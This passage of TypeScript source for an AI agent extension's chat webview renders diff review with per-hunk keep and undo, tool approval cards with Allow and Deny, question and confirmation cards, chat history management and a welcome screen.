    changesPop.classList.remove("open");
    return;
  }
  changesBar.classList.remove("hidden");

  const totalAdd = items.reduce((s, f) => s + (f.added || 0), 0);
  const totalDel = items.reduce((s, f) => s + (f.removed || 0), 0);
  changesBadge.innerHTML =
    `✎ ${items.length} file${items.length > 1 ? "s" : ""} ` +
    `<span class="add">+${totalAdd}</span> <span class="del">−${totalDel}</span>`;

  // popup contents
  changesPop.innerHTML = "";
  const head = document.createElement("div");
  head.className = "cp-head";
  head.innerHTML = `<span>Changes</span>`;
  const acts = document.createElement("div");
  acts.className = "cp-actions";
  const keepAll = document.createElement("button");
  keepAll.className = "mini";
  keepAll.textContent = "Keep all";
  keepAll.addEventListener("click", () =>
    items.forEach((f) => vscode.postMessage({ type: "keepChange", path: f.path }))
  );
  const revAll = document.createElement("button");
  revAll.className = "mini secondary";
  revAll.textContent = "Revert all";
  revAll.addEventListener("click", () =>
    items.forEach((f) => vscode.postMessage({ type: "revertChange", path: f.path }))
  );
  acts.appendChild(keepAll);
  acts.appendChild(revAll);
  head.appendChild(acts);
  changesPop.appendChild(head);

  for (const f of items) {
    const file = document.createElement("div");
    file.className = "cp-file";

    const fhead = document.createElement("div");
    fhead.className = "cp-fhead";
    const nm = document.createElement("span");
    nm.className = "cp-fname";
    nm.textContent = f.name;
    nm.title = f.path;
    const st = document.createElement("span");
    st.className = "cp-fstat";
    st.innerHTML = `<span class="add">+${f.added}</span> <span class="del">−${f.removed}</span>`;
    const openBtn = document.createElement("button");
    openBtn.className = "mini cp-open";
    openBtn.textContent = "⇄";
    openBtn.title = "Open diff in editor";
    openBtn.addEventListener("click", (e) => {
      e.stopPropagation();
      vscode.postMessage({ type: "openChange", path: f.path });
    });
    const rev = document.createElement("button");
    rev.className = "mini secondary";
    rev.textContent = "↩";
    rev.title = "Revert this file";
    rev.addEventListener("click", (e) => {
      e.stopPropagation();
      vscode.postMessage({ type: "revertChange", path: f.path });
    });
    fhead.appendChild(nm);
    fhead.appendChild(st);
    fhead.appendChild(openBtn);
    fhead.appendChild(rev);

    const diff = document.createElement("div");
    diff.className = "cp-diff";
    diff.appendChild(renderDiffLines(f.hunks || [], f.path));

    fhead.addEventListener("click", () => diff.classList.toggle("open"));
    file.appendChild(fhead);
    file.appendChild(diff);
    changesPop.appendChild(file);
  }
}

// Zed-style per-hunk review: each changed block gets its own Keep / Undo, so
// you can accept half an edit and reject the rest without leaving the panel.
function renderDiffLines(hunks: any[], filePath?: string): HTMLElement {
  const box = document.createElement("div");
  hunks.forEach((h, idx) => {
    const hunk = document.createElement("div");
    hunk.className = "hunk";
    if (filePath && hunks.length > 0) {
      const bar = document.createElement("div");
      bar.className = "hunk-bar";
      const label = document.createElement("span");
      label.className = "hunk-label";
      label.textContent =
        `@@ ${idx + 1}/${hunks.length}` +
        ` −${(h.del || []).length} +${(h.add || []).length}`;
      const keep = document.createElement("button");
      keep.className = "hunk-act keep";
      keep.textContent = "✓ Keep";
      keep.title = "Accept this block (others stay reviewable)";
      keep.addEventListener("click", (e) => {
        e.stopPropagation();
        vscode.postMessage({ type: "keepHunk", path: filePath, hunkIndex: idx });
      });
      const undo = document.createElement("button");
      undo.className = "hunk-act undo";
      undo.textContent = "↩ Undo";
      undo.title = "Revert this block to its original lines";
      undo.addEventListener("click", (e) => {
        e.stopPropagation();
        vscode.postMessage({ type: "revertHunk", path: filePath, hunkIndex: idx });
      });
      bar.appendChild(label);
      bar.appendChild(keep);
      bar.appendChild(undo);
      hunk.appendChild(bar);
    }
    for (const d of h.del || []) {
      const line = document.createElement("div");
      line.className = "diff-line del";
      line.textContent = "− " + d;
      hunk.appendChild(line);
    }
    for (const a of h.add || []) {
      const line = document.createElement("div");
      line.className = "diff-line add";
      line.textContent = "+ " + a;
      hunk.appendChild(line);
    }
    box.appendChild(hunk);
  });
  return box;
}

function renderMode(options: any[], current: string) {
  if (options?.length) modeOptions = options;
  if (current) currentMode = current;
  const active = modeOptions.find((o) => o.value === currentMode);
  modeBtn.textContent = (active ? active.label : currentMode) + " ▾";
  modeBtn.title = active?.title || "Mode";
  modeMenu.innerHTML = `<div class="menu-head">Mode</div>`;
  for (const o of modeOptions) {
    const item = document.createElement("div");
    item.className = "mode-item" + (o.value === currentMode ? " active" : "");
    item.innerHTML = `<span class="mode-item-label">${esc(o.label)}</span><span class="mode-item-desc">${esc(o.title || "")}</span>`;
    item.addEventListener("click", (e) => {
      e.stopPropagation();
      currentMode = o.value;
      modeMenu.classList.remove("open");
      renderMode(modeOptions, o.value);
      vscode.postMessage({ type: "setMode", mode: o.value });
    });
    modeMenu.appendChild(item);
  }
}

function mergeSlash(items: string[]) {
  // Rebuild from the real SDK list each time, keeping only the client-side
  // commands we actually handle. This drops stale hardcoded guesses.
  const set = new Set<string>(["clear", "new"]);
  for (const c of items || []) set.add(c.replace(/^\//, ""));
  slashList = Array.from(set).sort();
}

function renderSystem(subtype: string, data: any) {
  // Only surface meaningful lifecycle events. Other system subtypes (telemetry
  // like thinking_tokens, etc.) are noise and were spamming the log.
  if (subtype === "compact_boundary") {
    const pre = data?.compact_metadata?.pre_tokens;
    addStatus(`🗜 Context compacted${pre ? ` (was ${pre} tokens)` : ""}`, "done");
  }
}

function renderStored(msg: any) {
  if (msg.kind !== "thinking") endThinking();
  switch (msg.kind) {
    case "user":
      addUser(msg.text);
      break;
    case "assistant": {
      const body = assistantCard(msg.model);
      body.innerHTML = md(msg.text);
      enhanceCode(body);
      linkifyPaths(body);
      break;
    }
    case "thinking":
      // Don't end here: consecutive stored thinking chunks merge into ONE block
      // (line above ends it when a non-thinking message follows), so a reloaded
      // chat collapses reasoning the same way it does live.
      addThinking(msg.text);
      break;
    case "tool": {
      if (msg.tool && msg.tool.name) {
        // Rebuild the SAME rich terminal/tool card as live, with its output.
        const tid = "stored-tool-" + storedToolSeq++;
        addTool(tid, msg.tool.name, msg.tool.input);
        if (msg.tool.result != null) {
          addToolResult(tid, msg.tool.result, !!msg.tool.isError, msg.tool.durationMs);
        }
      } else {
        const d = document.createElement("div");
        d.className = "tool-card";
        d.innerHTML = `<div class="tool-head"><span class="tool-name">${esc(msg.text)}</span></div>`;
        log.appendChild(d);
      }
      break;
    }
    case "status":
      addStatus(msg.text, "done");
      break;
    case "error":
      addStatus(`⚠ ${msg.text}`, "error");
      break;
  }
}

// ---- AskUserQuestion: interactive option cards ----
function renderQuestion(id: string, questions: any[]) {
  if (document.querySelector(`[data-qid="${id}"]`)) return; // already shown

  const qs = Array.isArray(questions) ? questions : [];
  const card = document.createElement("div");
  card.className = "question-card";
  card.dataset.qid = id;
  // per-question selection state: array (multiSelect) or string|null (single)
  const sel: (string[] | string | null)[] = qs.map((q) => (q.multiSelect ? [] : null));

  qs.forEach((q, qi) => {
    const block = document.createElement("div");
    block.className = "q-block";
    block.innerHTML =
      `<div class="q-head">` +
      (q.header ? `<span class="q-chip">${esc(q.header)}</span>` : "") +
      `<span class="q-text">${esc(q.question || "")}</span></div>`;
    const opts = document.createElement("div");
    opts.className = "q-opts";

    (q.options || []).forEach((o: any) => {
      const btn = document.createElement("button");
      btn.className = "q-opt";
      btn.innerHTML =
        `<span class="q-opt-label">${esc(o.label)}</span>` +
        (o.description ? `<span class="q-opt-desc">${esc(o.description)}</span>` : "");
      btn.addEventListener("click", () => {
        if (q.multiSelect) {
          btn.classList.toggle("sel");
          const arr = sel[qi] as string[];
          const i = arr.indexOf(o.label);
          if (i >= 0) arr.splice(i, 1);
          else arr.push(o.label);
        } else {
          opts.querySelectorAll(".q-opt").forEach((b) => b.classList.remove("sel"));
          btn.classList.add("sel");
          sel[qi] = o.label;
          block.removeAttribute("data-other");
          (block.querySelector(".q-other-input") as HTMLElement)?.classList.add("hidden");
        }
      });
      opts.appendChild(btn);
    });

    const otherBtn = document.createElement("button");
    otherBtn.className = "q-opt q-other";
    otherBtn.textContent = "✎ Other…";
    const otherInput = document.createElement("input");
    otherInput.className = "q-other-input hidden";
    otherInput.placeholder = "Type your answer";
    otherBtn.addEventListener("click", () => {
      otherInput.classList.toggle("hidden");
      if (!otherInput.classList.contains("hidden")) otherInput.focus();
      if (!q.multiSelect) {
        opts.querySelectorAll(".q-opt").forEach((b) => b.classList.remove("sel"));
        sel[qi] = null;
      }
    });
    otherInput.addEventListener("input", () => {
      block.dataset.other = otherInput.value.trim();
    });

    opts.appendChild(otherBtn);
    block.appendChild(opts);
    block.appendChild(otherInput);
    card.appendChild(block);
  });

  const submit = document.createElement("button");
  submit.className = "q-submit";
  submit.textContent = "Send answer";
  submit.addEventListener("click", () => {
    const blocks = card.querySelectorAll(".q-block");
    const parts = qs.map((q, qi) => {
      const other = (blocks[qi] as HTMLElement).dataset.other?.trim();
      let val: string;
      if (q.multiSelect) {
        const arr = [...(sel[qi] as string[])];
        if (other) arr.push(other);
        val = arr.join(", ") || "(none)";
      } else {
        val = other || (sel[qi] as string) || "(skipped)";
      }
      return `${q.header || q.question || "Q" + (qi + 1)}: ${val}`;
    });
    vscode.postMessage({ type: "questionResponse", id, answer: parts.join("\n") });
    card.classList.add("answered");
    card.querySelectorAll("button, input").forEach((el) => ((el as HTMLButtonElement).disabled = true));
    submit.textContent = "✓ Sent";
  });
  card.appendChild(submit);

  log.appendChild(card);
  scroll();
}

// Build an Allow/Deny row wired to the host; onDone runs after the user picks.
function approvalRow(m: any, onDone: (approved: boolean) => void): HTMLElement {
  const row = document.createElement("div");
  row.className = "approval-actions";
  const allow = document.createElement("button");
  allow.textContent = "Allow";
  const deny = document.createElement("button");
  deny.textContent = "Deny";
  deny.className = "secondary";
  row.appendChild(allow);
  row.appendChild(deny);
  const respond = (approved: boolean) => {
    vscode.postMessage({ type: "approvalResponse", id: m.id, approved });
    allow.disabled = true;
    deny.disabled = true;
    onDone(approved);
  };
  allow.addEventListener("click", () => respond(true));
  deny.addEventListener("click", () => respond(false));
  // Enter approves, Esc denies — and grab focus so Enter works immediately
  // (the composer no longer eats it while an approval is pending).
  // In the browser panel neither happens on its own: focus stays where the user is typing, and Enter
  // never approves (text typed while the agent works must not be able to grant an action). Esc still denies.
  const onKey = (e: KeyboardEvent) => {
    if (e.key === "Enter" && !isRemote) { e.preventDefault(); allow.click(); }
    else if (e.key === "Escape") { e.preventDefault(); deny.click(); }
  };
  allow.addEventListener("keydown", onKey);
  deny.addEventListener("keydown", onKey);
  // Focus once attached so Enter approves immediately. preventScroll matters in
  // the browser (web app): a plain .focus() scrolls the button into view, which
  // fights the chat's bottom-pinning and makes the log visibly jitter.
  if (!isRemote) setTimeout(() => allow.focus({ preventScroll: true }), 0);
  return row;
}

function renderApproval(m: any) {
  if (document.querySelector(`[data-aid="${m.id}"]`)) return; // already shown
  const meta = toolMeta(m.toolName);
  const cmd: string | undefined =
    typeof m.input?.command === "string" ? m.input.command : undefined;
  const sig = m.toolName + "" + (m.input ? JSON.stringify(m.input) : "");

  // Cursor-style merge: the tool card for this call already exists (created from
  // the streamed tool_use just before approval is asked), so host Allow/Deny
  // INSIDE it instead of spawning a second card. Match by signature first, then
  // fall back to tool name (the two inputs can serialize differently).
  const live = (c: HTMLElement) =>
    !c.dataset.approved &&
    !c.classList.contains("tool-ok") &&
    !c.classList.contains("tool-err");
  const cards = [...toolCards.values()].reverse();
  const target: HTMLElement | null =
    cards.find((c) => c.dataset.sig === sig && live(c)) ||
    cards.find((c) => c.dataset.tool === m.toolName && live(c)) ||
    null;

  if (target) {
    const card = target;
    card.dataset.aid = m.id;
    card.dataset.approved = "pending";
    card.classList.add("await-approval");
    const status = card.querySelector(".tool-status") as HTMLElement | null;
    if (status) {
      status.className = "tool-status pending";
      status.textContent = "?";
    }
    const termOut = card.querySelector(".term-out") as HTMLElement | null;
    if (termOut) {
      termOut.className = "term-out await";
      termOut.textContent = "awaiting approval…";
    }
    const row = approvalRow(m, (approved) => {
      card.dataset.approved = approved ? "yes" : "no";
      card.classList.remove("await-approval");
      row.remove();
      if (status) {
        if (approved) {
          status.className = "tool-status running";
          status.innerHTML = `<span class="spin"></span>`;
        } else {
          status.className = "tool-status err";
          status.textContent = "✕";
        }
      }
      if (termOut) {
        if (approved) {
          termOut.className = "term-out running";
          termOut.innerHTML = `<span class="term-wait">running</span>`;
        } else {
          termOut.className = "term-out filled err";
          termOut.textContent = "Denied by user.";
        }
      }
    });
    card.appendChild(row);
    scroll();
    return;
  }

  // Fallback: standalone card (approval arrived before its tool card / no match).
  const box = document.createElement("div");
  box.className = "tool-card approval-card enter pending";
  box.dataset.aid = m.id;
  const head = document.createElement("div");
  head.className = "tool-head";
  const nm = document.createElement("span");
  nm.className = "tool-name";
  nm.textContent =
    meta.kind === "term" ? "❯ Run command?" : `⚠ Allow ${shortToolName(m.toolName)}?`;
  head.appendChild(nm);
  box.appendChild(head);
  if (meta.kind === "term") {
    const term = document.createElement("div");
    term.className = "term";
    term.innerHTML = `<div class="term-cmd"><span class="term-prompt">$</span> ${esc(
      cmd || shortToolName(m.toolName)
    )}</div>`;
    box.appendChild(term);
  } else {
    const pre = document.createElement("pre");
    pre.className = "code";
    pre.innerHTML = `<code>${esc(JSON.stringify(m.input, null, 2))}</code>`;
    box.appendChild(pre);
  }
  const row = approvalRow(m, (approved) => {
    box.classList.remove("pending");
    box.classList.add(approved ? "approved" : "denied");
  });
  box.appendChild(row);
  log.appendChild(box);
  scroll();
}

/** Close an approval card the SAME way clicking Allow/Deny would — driven by the
 *  host's approvalResolved broadcast, so a request answered on one device clears
 *  on every device. Idempotent: a no-op if the card is gone or already settled. */
function resolveApprovalCard(id: string, approved: boolean) {
  const card = document.querySelector(`[data-aid="${id}"]`) as HTMLElement | null;
  if (!card) return;
  if (card.dataset.approved === "yes" || card.dataset.approved === "no") return;
  card.querySelector(".approval-actions")?.remove();
  card.classList.remove("await-approval", "pending");

  // Standalone fallback card.
  if (card.classList.contains("approval-card")) {
    card.classList.add(approved ? "approved" : "denied");
    return;
  }

  // Merged tool card.
  card.dataset.approved = approved ? "yes" : "no";
  const status = card.querySelector(".tool-status") as HTMLElement | null;
  if (status) {
    if (approved) {
      status.className = "tool-status running";
      status.innerHTML = `<span class="spin"></span>`;
    } else {
      status.className = "tool-status err";
      status.textContent = "✕";
    }
  }
  const termOut = card.querySelector(".term-out") as HTMLElement | null;
  if (termOut) {
    if (approved) {
      termOut.className = "term-out running";
      termOut.innerHTML = `<span class="term-wait">running</span>`;
    } else {
      termOut.className = "term-out filled err";
      termOut.textContent = "Denied by user.";
    }
  }
}

/** Close a question card answered on another device. */
function resolveQuestionCard(id: string) {
  const card = document.querySelector(`[data-qid="${id}"]`) as HTMLElement | null;
  if (!card || card.classList.contains("answered")) return;
  card.classList.add("answered");
  card.querySelectorAll("button, input").forEach((el) => ((el as HTMLButtonElement).disabled = true));
}

// ---- in-UI confirmation (rewind etc.) — works in the panel AND the web app,
//      unlike a native VS Code dialog which only the desktop could see ----
function renderConfirm(
  id: string,
  title: string,
  options: { label: string; detail?: string; value: string }[]
) {
  if (document.querySelector(`[data-cid="${id}"]`)) return; // already shown
  const box = document.createElement("div");
  box.className = "confirm-card enter";
  box.dataset.cid = id;

  const head = document.createElement("div");
  head.className = "confirm-title";
  head.textContent = title || "Confirm?";
  box.appendChild(head);

  const respond = (value: string | null) => {
    if (box.dataset.done) return;
    box.dataset.done = "1";
    vscode.postMessage({ type: "confirmResponse", id, value });
    box.querySelectorAll("button").forEach((b) => ((b as HTMLButtonElement).disabled = true));
    box.classList.add("answered");
  };

  (options || []).forEach((o, i) => {
    const b = document.createElement("button");
    b.className = "confirm-opt" + (i === 0 ? " primary" : "");
    b.innerHTML = `<span class="confirm-opt-label">${esc(o.label)}</span>${
      o.detail ? `<span class="confirm-opt-detail">${esc(o.detail)}</span>` : ""
    }`;
    b.addEventListener("click", () => respond(o.value));
    box.appendChild(b);
  });

  const cancel = document.createElement("button");
  cancel.className = "confirm-opt cancel";
  cancel.textContent = "Cancel";
  cancel.addEventListener("click", () => respond(null));
  box.appendChild(cancel);

  // Enter = first option, Esc = cancel.
  const onKey = (e: KeyboardEvent) => {
    if (e.key === "Enter") { e.preventDefault(); (box.querySelector(".confirm-opt") as HTMLButtonElement)?.click(); }
    else if (e.key === "Escape") { e.preventDefault(); cancel.click(); }
  };
  box.addEventListener("keydown", onKey);
  log.appendChild(box);
  setTimeout(() => (box.querySelector(".confirm-opt") as HTMLButtonElement)?.focus({ preventScroll: true }), 0);
  scroll();
}

function resolveConfirmCard(id: string) {
  const card = document.querySelector(`[data-cid="${id}"]`) as HTMLElement | null;
  if (!card || card.dataset.done) return;
  card.dataset.done = "1";
  card.classList.add("answered");
  card.querySelectorAll("button").forEach((b) => ((b as HTMLButtonElement).disabled = true));
}

// ---- drag & drop files into the chat → attach them ----
document.addEventListener("dragover", (e) => {
  if (e.dataTransfer?.types?.includes("Files") || e.dataTransfer?.types?.includes("text/uri-list")) {
    e.preventDefault();
    document.body.classList.add("dropping");
  }
});
document.addEventListener("dragleave", (e) => {
  if (e.relatedTarget === null) document.body.classList.remove("dropping");
});
document.addEventListener("drop", (e) => {
  document.body.classList.remove("dropping");
  const dt = e.dataTransfer;
  if (!dt) return;
  const list = dt.getData("text/uri-list") || dt.getData("text/plain") || "";
  const paths: string[] = [];
  for (let line of list.split(/\r?\n/)) {
    line = line.trim();
    if (!line || line.startsWith("#")) continue;
    if (line.startsWith("file:")) {
      try {
        const p = decodeURIComponent(new URL(line).pathname).replace(/^\/([A-Za-z]:)/, "$1");
        paths.push(p);
      } catch {
        /* ignore */
      }
    }
  }
  if (paths.length) {
    e.preventDefault();
    vscode.postMessage({ type: "addPathAttachment", paths });
  }
});

// Show the welcome splash until a conversation loads / a message is sent.
renderWelcome();

// Tell the extension we're listening, so it (re)sends initial state.
vscode.postMessage({ type: "ready" });

// `text` / `loginLabel` are optional overrides (the browser extension's API-key
// mode has no "subscription login"); the VS Code panel sends none.
function renderAuth(ok: boolean, o?: { text?: string; loginLabel?: string; recheckLabel?: string }) {
  const b = $("auth-banner");
  if (ok) {
    b.classList.add("hidden");
    b.innerHTML = "";
    return;
  }
  b.classList.remove("hidden");
  b.innerHTML = "";
  const msg = document.createElement("span");
  msg.className = "auth-msg";
  msg.textContent = o?.text || "⚠ Not logged in to Claude. Sign in with your subscription:";
  b.appendChild(msg);
  const login = document.createElement("button");
  login.className = "mini";
  login.textContent = o?.loginLabel || "Log in";
  login.addEventListener("click", () => vscode.postMessage({ type: "login" }));
  const recheck = document.createElement("button");
  recheck.className = "mini secondary";
  recheck.textContent = o?.recheckLabel || "I'm logged in";
  recheck.addEventListener("click", () => vscode.postMessage({ type: "recheckAuth" }));
  b.appendChild(login);
  b.appendChild(recheck);
}

function renderTabs(items: any[], activeId?: string) {
  tabs.innerHTML = "";
  const recent = (items || []).slice(0, 12);
  for (const c of recent) {
    const t = document.createElement("div");
    const isRun = runningChatIds.has(c.id);
    t.className = "tab" + (c.id === activeId ? " active" : "") + (isRun ? " running" : "");
    t.title = c.title + (isRun ? " — working…" : "");
    t.innerHTML =
      (isRun ? `<span class="tab-spin"></span>` : "") +
      (c.pinned ? "📌 " : "") +
      esc(c.title || "chat");
    t.addEventListener("click", () => vscode.postMessage({ type: "openConversation", id: c.id }));
    tabs.appendChild(t);
  }
  // Always keep the tab strip present so its space is fixed (no layout jump).
}

function renderConversations(_items?: any[]) {
  chatsPanel.innerHTML = "";
  const search = document.createElement("input");
  search.className = "chat-search";
  search.type = "text";
  search.placeholder = "Search chats…";
  search.value = chatFilter;
  search.addEventListener("input", () => {
    chatFilter = search.value;
    fillChatRows();
  });
  chatsPanel.appendChild(search);
  const rows = document.createElement("div");
  rows.id = "chat-rows";
  chatsPanel.appendChild(rows);
  fillChatRows();
  search.focus();
}

function fillChatRows() {
  const rows = document.getElementById("chat-rows");
  if (!rows) return;
  const q = chatFilter.trim().toLowerCase();
  const items = allConversations.filter(
    (c) =>
      !q ||
      (c.title || "").toLowerCase().includes(q) ||
      (c.preview || "").toLowerCase().includes(q)
  );
  rows.innerHTML = "";
  if (!items.length) {
    rows.innerHTML = `<div class="ck-empty">${
      allConversations.length ? "No chats found." : "No conversations yet."
    }</div>`;
    return;
  }
  for (const c of items) {
    const row = document.createElement("div");
    row.className = "ck-row chat-row" + (c.id === activeConvId ? " active" : "");

    const pin = document.createElement("button");
    pin.className = "chat-pin" + (c.pinned ? " on" : "");
    pin.textContent = c.pinned ? "📌" : "📌";
    pin.title = c.pinned ? "Unpin" : "Pin to top";
    pin.addEventListener("click", (e) => {
      e.stopPropagation();
      vscode.postMessage({ type: "pinConversation", id: c.id, pinned: !c.pinned });
    });

    const meta = document.createElement("div");
    meta.className = "ck-meta";
    meta.innerHTML =
      `<div class="chat-title">${esc(c.title || "(untitled)")}</div>` +
      (c.preview ? `<div class="chat-prev">${esc(c.preview)}</div>` : "");
    meta.addEventListener("click", () => {
      vscode.postMessage({ type: "openConversation", id: c.id });
      chatsPanel.classList.add("hidden");
    });

    const ren = document.createElement("button");
    ren.className = "chat-ren";
    ren.textContent = "✎";
    ren.title = "Rename";
    ren.addEventListener("click", (e) => {
      e.stopPropagation();
      startRename(row, c);
    });

    const del = document.createElement("button");
    del.className = "chat-del";
    del.textContent = "✕";
    del.title = "Delete chat";
    del.addEventListener("click", (e) => {
      e.stopPropagation();
      vscode.postMessage({ type: "deleteConversation", id: c.id });
    });

    row.appendChild(pin);
    row.appendChild(meta);
    row.appendChild(ren);
    row.appendChild(del);
    rows.appendChild(row);
  }
}

function startRename(row: HTMLElement, c: any) {
  const meta = row.querySelector(".ck-meta") as HTMLElement;
  if (!meta) return;
  const inp = document.createElement("input");
  inp.className = "chat-rename";
  inp.value = c.title || "";
  row.replaceChild(inp, meta);
  inp.focus();
  inp.select();
  let done = false;
  const commit = (save: boolean) => {
    if (done) return;
    done = true;
    const t = inp.value.trim();
    if (save && t && t !== c.title) {
      vscode.postMessage({ type: "renameConversation", id: c.id, title: t });
    } else {
      fillChatRows();
    }
  };
  inp.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      e.preventDefault();
      commit(true);
    } else if (e.key === "Escape") {
      commit(false);
    }
  });
  inp.addEventListener("blur", () => commit(true));
}

// ---- welcome / context pill / context insert ----
function renderWelcome() {
  if (log.children.length) return;
  const w = document.createElement("div");
  w.className = "welcome";
  w.innerHTML =
    (AVATAR && avatarOk
      ? `<img class="welcome-avatar" src="${AVATAR}" alt="${esc(assistantName)}" />`
      : `<div class="welcome-logo">✦</div>`) +
    `<div class="welcome-title">${esc(assistantName)}</div>` +
    `<div class="welcome-sub">${document.body.classList.contains("browser")
      ? "Works in your browser — reads pages, clicks, types, fills forms, automates."
      : "Works in your workspace — reads, edits, runs commands."}</div>` +
    `<div class="welcome-chips"></div>` +
    `<div class="welcome-tips">⏎ send · ⇧⏎ newline · <b>@</b> file · <b>/</b> commands · Ctrl+V image</div>`;
  const box = w.querySelector(".welcome-chips") as HTMLElement;
  const chips = document.body.classList.contains("browser") ? [
    "Read this page and summarize it",
    "Fill out this form for me",
    "Find and click the login button",
    "Extract all the data from this table",
  ] : [
    "Explain this project's structure",
    "Find and fix bugs in the current file",
    "Add tests for the current file",
    "Review my recent changes",
  ];
  for (const c of chips) {
    const b = document.createElement("button");
    b.className = "welcome-chip";
    b.textContent = c;
    b.addEventListener("click", () => {
      input.value = c;
      input.focus();
      autosize();
    });
    box.appendChild(b);
  }
  log.appendChild(w);
}

function fmtTokens(n: number): string {
  return n >= 1000 ? (n / 1000).toFixed(n >= 10000 ? 0 : 1) + "k" : String(n);
}

function updateContextPill(usage: any) {
  if (!usage) return;
  const inp =
    (usage.input_tokens || 0) +
    (usage.cache_read_input_tokens || 0) +
    (usage.cache_creation_input_tokens || 0);
  const out = usage.output_tokens || 0;
  if (!inp && !out) return;
  ctxPill.textContent = "🧠 " + fmtTokens(inp);
  ctxPill.title = `Last turn — input ${inp.toLocaleString()} tok · output ${out.toLocaleString()} tok`;
  ctxPill.classList.remove("hidden");
}

function insertContext(ctx: any) {
  const fence = "```";
  const ref = "`" + ctx.rel + ":" + ctx.startLine + "-" + ctx.endLine + "`";
  const lead = input.value && !input.value.endsWith("\n") ? "\n" : "";
  const block = `${lead}${ref}\n${fence}${ctx.lang || ""}\n${ctx.text}\n${fence}\n`;
  const caret = input.selectionStart ?? input.value.length;
  input.value = input.value.slice(0, caret) + block + input.value.slice(caret);
  input.selectionStart = input.selectionEnd = caret + block.length;
  input.focus();
  autosize();
}

